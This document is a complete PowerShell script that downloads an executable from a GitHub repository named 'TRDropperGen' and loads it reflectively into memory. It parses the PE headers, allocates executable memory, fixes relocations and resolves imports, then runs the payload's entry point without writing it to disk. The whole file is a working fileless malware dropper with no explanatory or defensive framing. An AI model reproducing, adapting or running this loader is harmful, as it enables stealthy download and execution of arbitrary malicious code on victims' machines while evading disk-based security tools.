$env:LIB = ""
$env:LIBPATH = ""

# Допълнително почистване на други потенциално проблемни пътища
$env:INCLUDE = ""
$pe_bytes = (New-Object Net.WebClient).DownloadData("https://github.com/TRDropperGen/files/raw/refs/heads/main/ps.exe")


function Invoke-Reflective {
param([Parameter(Mandatory = $true)][byte[]]$pe_bytes)

$code = @"
using System;
using System.Runtime.InteropServices;
namespace PE {
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION {
        public UInt32 VirtualAddress;
        public UInt32 SizeOfBlock;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_IMPORT_DESCRIPTOR {
        public UInt32 OriginalFirstThunk;
        public UInt32 TimeDateStamp;
        public UInt32 ForwarderChain;
        public UInt32 Name;
        public UInt32 FirstThunk;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER {
        public UInt16 e_magic;
        public UInt16 e_cblp;
        public UInt16 e_cp;
        public UInt16 e_crlc;
        public UInt16 e_cparhdr;
        public UInt16 e_minalloc;
        public UInt16 e_maxalloc;
        public UInt16 e_ss;
        public UInt16 e_sp;
        public UInt16 e_csum;
        public UInt16 e_ip;
        public UInt16 e_cs;
        public UInt16 e_lfarlc;
        public UInt16 e_ovno;
        [MarshalAs(UnmanagedType.ByValArray,SizeConst=4)]
        public UInt16 [] e_res1;
        public UInt16 e_oemid;
        public UInt16 e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray,SizeConst=10)]
        public UInt16[] e_res2;
        public Int32 e_lfanew;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_FILE_HEADER {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }
    [StructLayout(LayoutKind.Sequential,Size=8)]
    public struct IMAGE_DATA_DIRECTORY {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }
    public enum MagicType : ushort {
        IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
        IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
    }
    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_OPTIONAL_HEADER64 {
        [FieldOffset(0)] public MagicType Magic;
        [FieldOffset(16)] public uint AddressOfEntryPoint;
        [FieldOffset(24)] public ulong ImageBase;
        [FieldOffset(32)] public uint SectionAlignment;
        [FieldOffset(36)] public uint FileAlignment;
        [FieldOffset(56)] public uint SizeOfImage;
        [FieldOffset(60)] public uint SizeOfHeaders;
        [FieldOffset(120)] public IMAGE_DATA_DIRECTORY ImportTable;
        [FieldOffset(152)] public IMAGE_DATA_DIRECTORY BaseRelocationTable;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_NT_HEADERS {
        public UInt32 Signature;
        public IMAGE_FILE_HEADER Fileheader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }
    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)] public UInt32 VirtualSize;
        [FieldOffset(12)] public UInt32 VirtualAddress;
        [FieldOffset(16)] public UInt32 SizeOfRawData;
        [FieldOffset(20)] public UInt32 PointerToRawData;
        [FieldOffset(36)] public UInt32 Characteristics;
    }
}
"@

$func_code = @"
[DllImport("kernel32.dll",SetLastError = true)]
public static extern IntPtr VirtualAlloc(IntPtr address,UIntPtr size,UInt32 flAllocationType,UInt32 flProtect);
[DllImport("kernel32.dll",SetLastError = true)]
public static extern IntPtr GetProcAddress(IntPtr Base,string Func_Name);
[DllImport("kernel32.dll",SetLastError = true)]
public static extern IntPtr LoadLibraryA(string dll);
[DllImport("kernel32.dll",SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr handle,IntPtr Address,IntPtr buffer,UIntPtr size,ref UIntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll",SetLastError = true)]
public static extern bool VirtualFree(IntPtr lpAddress,UIntPtr dwSize,UInt32 dwFreeType);
[DllImport("kernel32.dll",SetLastError = true)]
public static extern IntPtr GetCurrentProcess();
"@

    Add-Type -TypeDefinition $code -Language CSharp
    $win32_Func = Add-Type -MemberDefinition $func_code -Name 'Win32_Func' -Namespace "WINAPI" -PassThru

    Function Sub-SignedIntAsUnsigned {
        Param([Int64]$Value1,[Int64]$Value2)
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
        if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
                $Val = $Value1Bytes[$i] - $CarryOver
                if ($Val -lt $Value2Bytes[$i]) {
                    $Val += 256
                    $CarryOver = 1
                } else {
                    $CarryOver = 0
                }
                [UInt16]$Sum = $Val - $Value2Bytes[$i]
                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Add-SignedIntAsUnsigned {
        Param([Int64]$Value1,[Int64]$Value2)
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
        if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
                $FinalBytes[$i] = $Sum -band 0x00FF
                if (($Sum -band 0xFF00) -eq 0x100) {
                    $CarryOver = 1
                } else {
                    $CarryOver = 0
                }
            }
        }
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Convert-UIntToInt {
        Param([UInt64]$Value)
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }

    Function Convert-Int16ToUInt16 {
        Param([Int16]$Value)
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToUInt16($ValueBytes, 0))
    }

    function Get-DelegateType {
        Param (
            [Type[]]$Parameters = (New-Object Type[](0)),
            [Type]$ReturnType = [Void]
        )
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        return $TypeBuilder.CreateType()
    }

    function Fix-Relocation {
        param([IntPtr]$pe_base,[UInt32]$base_rva,[System.IntPtr]$orig_base)
        $base_rel_type = 0xa000
        if($base_rva -eq 0) { return $false }
        $delta = Sub-SignedIntAsUnsigned $pe_base $orig_base
        $reloc_ptr = Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $base_rva)
        $reloc_struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($reloc_ptr,[Type][PE.IMAGE_BASE_RELOCATION])
        while ($reloc_struct.VirtualAddress) {
            $addr = Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $reloc_struct.VirtualAddress)
            $number_of_entry = ($reloc_struct.SizeOfBlock - ([UInt32]8)) /2
            $entry_ptr = Add-SignedIntAsUnsigned $reloc_ptr 8
            for($i=0;$i -lt $number_of_entry ; $i++) {
                $type = Convert-Int16ToUInt16 $([System.Runtime.InteropServices.Marshal]::ReadInt16($entry_ptr))
                if( $($type -band $base_rel_type) -eq $base_rel_type) {
                    $offset = $type -band 0xfff
                    $src_addr = Add-SignedIntAsUnsigned $addr $offset
                    $data = Add-SignedIntAsUnsigned $([System.Runtime.InteropServices.Marshal]::ReadIntPtr($src_addr)) $delta
                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($src_addr,$data)
                }
                $entry_ptr = Add-SignedIntAsUnsigned $entry_ptr 2
            }
            $reloc_ptr = Add-SignedIntAsUnsigned $reloc_ptr $(Convert-UIntToInt $reloc_struct.SizeOfBlock)
            $reloc_struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($reloc_ptr,[Type][PE.IMAGE_BASE_RELOCATION])
        }
        return $true
    }

    function Load-Import {
        param ([System.IntPtr]$pe_base,[UInt32]$import_rva)
        $ordinal_flag = 0x8000000000000000
        if($import_rva -eq 0) { return $true }
        $import_ptr = Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $import_rva)
        $import_struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($import_ptr,[Type][PE.IMAGE_IMPORT_DESCRIPTOR])
        while($import_struct.Name) {
            $dll_name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi( $(Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $import_struct.Name) ) ) 
            $dll = $win32_Func::LoadLibraryA($dll_name)
            if ($dll -eq 0) { return $false }
            $Othunk = Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $import_struct.OriginalFirstThunk)
            $Fthunk = Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $import_struct.FirstThunk)
            if($import_struct.OriginalFirstThunk -eq 0) { $Othunk = $Fthunk }
            $AddressOfData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Othunk,[Type][UIntPtr])
            while ($AddressOfData.ToUInt64() -ne 0 ) {
                if($AddressOfData.ToUInt64() -band $ordinal_flag) {
                    $func_addr = $win32_Func::GetProcAddress($dll,$($AddressOfData -band 0xffff))
                    if($func_addr -eq 0) { return $false }
                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($Fthunk,$func_addr)
                } else {
                    $func_name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($(Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $AddressOfData)) +2)
                    $func_addr = $win32_Func::GetProcAddress($dll,$func_name)
                    if($func_addr -eq 0) { return $false }
                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($Fthunk,$func_addr)
                }
                $Othunk = Add-SignedIntAsUnsigned $Othunk $([IntPtr]::Size)
                $Fthunk = Add-SignedIntAsUnsigned $Fthunk $([IntPtr]::Size)
                $AddressOfData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Othunk,[Type][UIntPtr])
            }
            $import_ptr = Add-SignedIntAsUnsigned $import_ptr $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][PE.IMAGE_IMPORT_DESCRIPTOR]))
            $import_struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($import_ptr,[Type][PE.IMAGE_IMPORT_DESCRIPTOR])
        }
        return $true
    }

    function Execute-Entry {
        param ([System.IntPtr]$pe_buf,[UInt32]$addessofentry,[UInt32]$Charactaristic)
        $dll_deleg = Get-DelegateType @([System.IntPtr],[UInt32],[System.IntPtr]) ([bool])
        $exe_deleg = Get-DelegateType @([IntPtr]) ([bool])
        if($addessofentry -eq 0) { return 0 }
        $entry_addr = Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $addessofentry)
        if($Charactaristic -band 0x2000) {
            $exec_func = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($entry_addr, $dll_deleg)
            $exec_func.Invoke($pe_base,1,0)
        } else {
            $exec_func = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($entry_addr, $exe_deleg)
            $exec_func.Invoke(0)
        }
    }

    [System.IntPtr]$pe_buf = 0
    [System.IntPtr]$pe_base = 0
    $cur_proc = $win32_Func::GetCurrentProcess()
    $pe_buf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($pe_bytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($pe_bytes,0,$pe_buf,$pe_bytes.Length)
    $dos_struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pe_buf,[Type][PE.IMAGE_DOS_HEADER])
    if($dos_struct.e_magic -ne 23117) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pe_buf);return
    }
    $nt_struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(Add-SignedIntAsUnsigned $pe_buf $(Convert-UIntToInt $dos_struct.e_lfanew)),[Type][PE.IMAGE_NT_HEADERS])
    if($nt_struct.OptionalHeader.Magic -ne [PE.MagicType]::IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pe_buf);return
    }
    $require_relocation = 0
    $pe_base = $win32_Func::VirtualAlloc($(Convert-UIntToInt $nt_struct.OptionalHeader.ImageBase),$nt_struct.OptionalHeader.SizeOfImage,0x00001000 -bor 0x00002000,0x40)
    if($pe_base -eq 0) {
        $require_relocation = 1
        $pe_base = $win32_Func::VirtualAlloc(0,$nt_struct.OptionalHeader.SizeOfImage,0x00001000 -bor 0x00002000,0x40)
    }
    $win32_Func::WriteProcessMemory($cur_proc,$pe_base,$pe_buf,$nt_struct.OptionalHeader.SizeOfHeaders,[ref]([UInt32]0)) | Out-Null
    $sec_ptr = $(Add-SignedIntAsUnsigned $pe_buf $(Convert-UIntToInt $dos_struct.e_lfanew))
    $sec_ptr = Add-SignedIntAsUnsigned $sec_ptr $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][PE.IMAGE_NT_HEADERS]))
    for($i=0;$i -lt $nt_struct.Fileheader.NumberOfSections;$i++) {
        $sec_struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($sec_ptr,[Type][PE.IMAGE_SECTION_HEADER])
        $src = Add-SignedIntAsUnsigned $pe_buf $(Convert-UIntToInt $sec_struct.PointerToRawData)
        $dest = Add-SignedIntAsUnsigned $pe_base $(Convert-UIntToInt $sec_struct.VirtualAddress)
        $win32_Func::WriteProcessMemory($cur_proc,$dest,$src,$sec_struct.SizeOfRawData,[ref]([UInt32]0)) | Out-Null
        $sec_ptr = Add-SignedIntAsUnsigned $sec_ptr $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][PE.IMAGE_SECTION_HEADER]))
    }
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pe_buf)
    $load_status = $true
    if($require_relocation -eq 1) {
        $load_status = Fix-Relocation $pe_base $nt_struct.OptionalHeader.BaseRelocationTable.VirtualAddress $(Convert-UIntToInt $nt_struct.OptionalHeader.ImageBase)
    }
    if($load_status -eq $true) {
        $load_status = Load-Import $pe_base $nt_struct.OptionalHeader.ImportTable.VirtualAddress
        if($load_status -eq $true) {
            Execute-Entry $pe_buf $nt_struct.OptionalHeader.AddressOfEntryPoint $nt_struct.Fileheader.Characteristics | Out-Null
        }
    }
    $win32_Func::VirtualFree($pe_base,([UInt32]0),0x00008000) | Out-Null
}

Invoke-Reflective -pe_bytes $pe_bytes